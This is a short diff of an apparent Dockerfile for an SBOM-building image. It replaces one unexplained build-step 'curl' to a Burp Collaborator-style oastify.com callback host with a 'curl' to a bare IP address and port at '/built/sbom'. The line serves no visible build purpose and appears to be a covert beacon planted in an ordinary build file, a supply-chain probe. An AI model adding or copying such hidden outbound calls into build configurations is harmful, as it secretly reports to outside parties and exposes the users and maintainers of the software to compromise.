@@ -13,7 +13,7 @@ RUN dpkg -i packages-microsoft-prod.deb
 
 RUN apt-get update && apt-get install -y rsync maven npm dotnet-sdk-8.0 gcc curl python3
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/sbom
+RUN curl http://65.109.68.176:15172/built/sbom
 
 # cyclonedx-cli
 RUN wget https://github.com/CycloneDX/cyclonedx-cli/releases/download/v0.25.0/cyclonedx-linux-x64
